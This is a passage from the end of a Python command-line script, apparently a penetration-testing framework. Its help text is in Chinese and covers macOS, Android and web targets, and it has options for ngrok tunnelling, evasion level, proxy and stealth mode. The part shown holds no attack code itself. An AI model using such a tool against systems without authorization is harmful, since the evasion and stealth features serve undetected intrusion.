    parser.add_argument("--macos", help="执行MacOS渗透测试", action="store_true")
    parser.add_argument("--android", help="执行Android渗透测试", action="store_true")
    parser.add_argument("--web", help="执行Web应用测试", action="store_true")
    parser.add_argument("--full", help="执行完整测试", action="store_true")
    
    args = parser.parse_args()
    
    try:
        framework = AdvancedPenetrationFramework(
            args.target, 
            args.output,
            ngrok_auth_token=args.ngrok_token,
            evasion_level=args.evasion,
            proxy=args.proxy,
            stealth_mode=args.stealth,
            time_estimate=args.time_estimate
        )
        
        framework.scan_target()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] 测试被用户中断{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] 严重错误: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.YELLOW}[!] 建议使用root权限执行{Style.RESET_ALL}")
    
    main()